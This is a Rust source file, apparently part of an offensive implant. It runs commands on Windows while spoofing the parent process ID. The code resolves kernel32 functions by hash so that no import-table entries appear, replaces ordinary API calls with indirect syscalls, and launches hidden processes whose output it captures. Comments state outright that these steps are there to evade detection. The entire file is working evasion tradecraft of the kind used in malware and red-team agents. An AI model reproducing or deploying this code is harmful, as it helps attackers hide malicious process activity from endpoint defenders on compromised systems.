//! Process creation helper for PPID spoofing.
use anyhow::Result;

#[cfg(all(windows, feature = "ppid-spoofing"))]
pub fn execute_command(
    program: &str,
    args: &[&str],
    capture_output: bool,
) -> Result<std::process::Output> {
    use std::ffi::c_void;
    use std::os::windows::ffi::OsStrExt;
    use winapi::um::processthreadsapi::PROCESS_INFORMATION;
    use winapi::um::winbase::{CREATE_NO_WINDOW, EXTENDED_STARTUPINFO_PRESENT, STARTUPINFOEXW};
    use winapi::um::winnt::{HANDLE, PROCESS_CREATE_PROCESS};
    const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x00020000;
    use winapi::um::winbase::STARTF_USESTDHANDLES;

    // Dynamically resolve kernel32 functions to avoid IAT entries.
    let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
        .ok_or_else(|| anyhow::anyhow!("could not resolve kernel32 base"))?;

    // InitializeProcThreadAttributeList
    let init_attr_list_addr = pe_resolve::get_proc_address_by_hash(
        k32,
        pe_resolve::hash_str(b"InitializeProcThreadAttributeList\0"),
    ).ok_or_else(|| anyhow::anyhow!("could not resolve InitializeProcThreadAttributeList"))?;
    type InitProcThreadAttrListFn = unsafe extern "system" fn(
        *mut c_void,  // lpAttributeList
        u32,          // dwAttributeCount
        u32,          // dwFlags
        *mut usize,   // lpSize
    ) -> i32; // BOOL
    let init_attr_list: InitProcThreadAttrListFn = std::mem::transmute(init_attr_list_addr);

    // UpdateProcThreadAttribute
    let update_attr_addr = pe_resolve::get_proc_address_by_hash(
        k32,
        pe_resolve::hash_str(b"UpdateProcThreadAttribute\0"),
    ).ok_or_else(|| anyhow::anyhow!("could not resolve UpdateProcThreadAttribute"))?;
    type UpdateProcThreadAttrFn = unsafe extern "system" fn(
        *mut c_void,  // lpAttributeList
        u32,          // dwFlags
        usize,        // Attribute
        *mut c_void,  // lpValue
        usize,        // cbSize
        *mut c_void,  // lpPreviousValue
        *mut usize,   // lpReturnSize
    ) -> i32; // BOOL
    let update_attr: UpdateProcThreadAttrFn = std::mem::transmute(update_attr_addr);

    // DeleteProcThreadAttributeList
    let delete_attr_addr = pe_resolve::get_proc_address_by_hash(
        k32,
        pe_resolve::hash_str(b"DeleteProcThreadAttributeList\0"),
    ).ok_or_else(|| anyhow::anyhow!("could not resolve DeleteProcThreadAttributeList"))?;
    type DeleteProcThreadAttrListFn = unsafe extern "system" fn(
        *mut c_void, // lpAttributeList
    );
    let delete_attr_list: DeleteProcThreadAttrListFn = std::mem::transmute(delete_attr_addr);

    // CreatePipe
    let create_pipe_addr = pe_resolve::get_proc_address_by_hash(
        k32,
        pe_resolve::hash_str(b"CreatePipe\0"),
    ).ok_or_else(|| anyhow::anyhow!("could not resolve CreatePipe"))?;
    type CreatePipeFn = unsafe extern "system" fn(
        *mut HANDLE,                              // hReadPipe
        *mut HANDLE,                              // hWritePipe
        *mut winapi::um::minwinbase::SECURITY_ATTRIBUTES, // lpPipeAttributes
        u32,                                      // nSize
    ) -> i32; // BOOL
    let create_pipe: CreatePipeFn = std::mem::transmute(create_pipe_addr);

    // CreateProcessW
    let create_process_w_addr = pe_resolve::get_proc_address_by_hash(
        k32,
        pe_resolve::hash_str(b"CreateProcessW\0"),
    ).ok_or_else(|| anyhow::anyhow!("could not resolve CreateProcessW"))?;
    type CreateProcessWFn = unsafe extern "system" fn(
        *mut u16,                 // lpApplicationName
        *mut u16,                 // lpCommandLine
        *mut c_void,              // lpProcessAttributes
        *mut c_void,              // lpThreadAttributes
        i32,                      // bInheritHandles
        u32,                      // dwCreationFlags
        *mut c_void,              // lpEnvironment
        *mut u16,                 // lpCurrentDirectory
        *mut winapi::um::processthreadsapi::STARTUPINFOW, // lpStartupInfo
        *mut PROCESS_INFORMATION, // lpProcessInformation
    ) -> i32; // BOOL
    let create_process_w: CreateProcessWFn = std::mem::transmute(create_process_w_addr);

    // ReadFile
    let read_file_addr = pe_resolve::get_proc_address_by_hash(
        k32,
        pe_resolve::hash_str(b"ReadFile\0"),
    ).ok_or_else(|| anyhow::anyhow!("could not resolve ReadFile"))?;
    type ReadFileFn = unsafe extern "system" fn(
        HANDLE,       // hFile
        *mut c_void,  // lpBuffer
        u32,          // nNumberOfBytesToRead
        *mut u32,     // lpNumberOfBytesRead
        *mut c_void,  // lpOverlapped
    ) -> i32; // BOOL
    let read_file: ReadFileFn = std::mem::transmute(read_file_addr);

    let parent_pid =
        crate::process_manager::get_spoof_parent_pid().unwrap_or_else(|| std::process::id());

    unsafe {
        // OpenProcess → NtOpenProcess (indirect syscall, no IAT entry)
        let mut p_handle_raw: usize = 0;
        if parent_pid != std::process::id() {
            let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
            obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
            let mut client_id = [0u64; 2];
            client_id[0] = parent_pid as u64;
            let status = syscall!(
                "NtOpenProcess",
                &mut p_handle_raw as *mut _ as u64,
                PROCESS_CREATE_PROCESS as u64,
                &mut obj_attr as *mut _ as u64,
                client_id.as_mut_ptr() as u64,
            );
            if status.is_err() || status.unwrap() < 0 {
                p_handle_raw = 0;
            }
        }
        let mut p_handle: HANDLE = if p_handle_raw != 0 { p_handle_raw as *mut _ } else { std::ptr::null_mut() };

        let mut size = 0;
        init_attr_list(std::ptr::null_mut(), 1, 0, &mut size);
        // InitializeProcThreadAttributeList may leave `size = 0` on failure
        // (e.g. invalid parameters), which would make the subsequent
        // `vec![0u8; 0]` allocation produce a dangling pointer that the second
        // call would then write through.  Fall back to a reasonable default
        // (H-7).
        if size == 0 {
            size = 1024;
        }
        let mut attr_list_buf = vec![0u8; size];
        let attr_list = attr_list_buf.as_mut_ptr() as *mut _;

        let mut si: STARTUPINFOEXW = std::mem::zeroed();
        si.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;

        if p_handle.is_null() == false {
            if init_attr_list(attr_list, 1, 0, &mut size) != 0 {
                let success = update_attr(
                    attr_list,
                    0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &mut p_handle as *mut _ as *mut _,
                    std::mem::size_of::<HANDLE>(),
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                );
                if success != 0 {
                    si.lpAttributeList = attr_list;
                }
            }
        }

        let mut stdout_rd: HANDLE = std::ptr::null_mut();
        let mut stdout_wr: HANDLE = std::ptr::null_mut();

        if capture_output {
            let mut sec_attr: winapi::um::minwinbase::SECURITY_ATTRIBUTES = std::mem::zeroed();
            sec_attr.nLength =
                std::mem::size_of::<winapi::um::minwinbase::SECURITY_ATTRIBUTES>() as u32;
            sec_attr.bInheritHandle = 1; // TRUE

            if create_pipe(&mut stdout_rd, &mut stdout_wr, &mut sec_attr, 0) != 0 {
                // SetHandleInformation → NtSetInformationObject (indirect syscall, no IAT entry)
                // ObjectHandleFlagInformation = 4: { Inherit, ProtectFromClose }
                #[repr(C)]
                struct ObjHandleFlagInfo {
                    inherit: u8,
                    protect_from_close: u8,
                }
                let flag_info = ObjHandleFlagInfo { inherit: 0, protect_from_close: 0 };
                let _ = syscall!(
                    "NtSetInformationObject",
                    stdout_rd as u64,                            // Handle
                    4u64,                                        // ObjectHandleFlagInformation
                    &flag_info as *const _ as u64,              // Info
                    std::mem::size_of::<ObjHandleFlagInfo>() as u64, // Length
                );
                si.StartupInfo.hStdOutput = stdout_wr;
                si.StartupInfo.hStdError = stdout_wr;
                si.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
            }
        }

        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
        // Quote arguments that contain whitespace or shell-meta characters so
        // the spawned process receives them as a single token (H-7).  The
        // previous bare concatenation broke any argument with a space.
        fn quote_arg(s: &str) -> String {
            if s.is_empty()
                || s.chars()
                    .any(|c| matches!(c, ' ' | '\t' | '"' | '&' | '|' | '<' | '>' | '^'))
            {
                format!("\"{}\"", s.replace('"', "\\\""))
            } else {
                s.to_string()
            }
        }
        let mut cmd_str = String::from(program);
        for a in args {
            cmd_str.push(' ');
            cmd_str.push_str(&quote_arg(a));
        }
        let mut cmd_w: Vec<u16> = std::ffi::OsStr::new(&cmd_str)
            .encode_wide()
            .chain(std::iter::once(0))
            .collect();

        let flags = EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW;
        let success = create_process_w(
            std::ptr::null(), // ApplicationName
            cmd_w.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            1, // InheritHandles
            flags,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut si.StartupInfo,
            &mut pi,
        );

        // Clean up writer handle in parent immediately
        if !stdout_wr.is_null() {
            pe_resolve::close_handle(stdout_wr);
        }

        if !si.lpAttributeList.is_null() {
            delete_attr_list(si.lpAttributeList);
        }
        if !p_handle.is_null() {
            pe_resolve::close_handle(p_handle);
        }

        if success == 0 {
            if !stdout_rd.is_null() {
                pe_resolve::close_handle(stdout_rd);
            }
            return Err(anyhow::anyhow!(
                "CreateProcessW failed with {}",
                std::io::Error::last_os_error()
            ));
        }

        let mut output_bytes = Vec::new();
        if capture_output && !stdout_rd.is_null() {
            let mut buf = [0u8; 4096];
            loop {
                let mut bytes_read = 0;
                let ok = read_file(
                    stdout_rd,
                    buf.as_mut_ptr() as _,
                    buf.len() as u32,
                    &mut bytes_read,
                    std::ptr::null_mut(),
                );
                if ok == 0 || bytes_read == 0 {
                    break;
                }
                output_bytes.extend_from_slice(&buf[..bytes_read as usize]);
            }
            pe_resolve::close_handle(stdout_rd);
        }

        // WaitForSingleObject → NtWaitForSingleObject (indirect syscall, no IAT entry)
        let _ = syscall!(
            "NtWaitForSingleObject",
            pi.hProcess as u64,    // Handle
            0u64,                    // Alertable = FALSE
            std::ptr::null::<u64>() as u64, // Timeout = NULL (infinite)
        );

        // GetExitCodeProcess → NtQueryInformationProcess(ProcessBasicInformation)
        // PROCESS_BASIC_INFORMATION contains ExitStatus as the first field after the NTSTATUS.
        #[repr(C)]
        struct ProcessBasicInformation {
            reserved1: *mut std::ffi::c_void,
            peb_base_address: *mut std::ffi::c_void,
            reserved2: [*mut std::ffi::c_void; 2],
            unique_process_id: usize,
            inherited_from_unique_process_id: usize,
            exit_status: i32,
        }
        let mut pbi: ProcessBasicInformation = std::mem::zeroed();
        let _ = syscall!(
            "NtQueryInformationProcess",
            pi.hProcess as u64,                            // ProcessHandle
            0u64,                                           // ProcessBasicInformation
            &mut pbi as *mut _ as u64,                     // ProcessInformation
            std::mem::size_of::<ProcessBasicInformation>() as u64, // Length
            std::ptr::null_mut::<u64>() as u64,            // ReturnLength
        );
        let exit_code = if pbi.exit_status == 259 { 259u32 } else { pbi.exit_status as u32 };

        let _ = syscall!("NtClose", pi.hThread as u64);
        let _ = syscall!("NtClose", pi.hProcess as u64);

        use std::os::windows::process::ExitStatusExt;
        Ok(std::process::Output {
            status: std::process::ExitStatus::from_raw(exit_code),
            stdout: output_bytes,
            stderr: Vec::new(),
        })
    }
}

// Fallback normal method
#[cfg(any(not(windows), not(feature = "ppid-spoofing")))]
pub fn execute_command(
    program: &str,
    args: &[&str],
    capture_output: bool,
) -> Result<std::process::Output> {
    let mut cmd = std::process::Command::new(program);
    cmd.args(args);
    if capture_output {
        let out = cmd.output()?;
        Ok(out)
    } else {
        let status = cmd.status()?;
        Ok(std::process::Output {
            status,
            stdout: Vec::new(),
            stderr: Vec::new(),
        })
    }
}
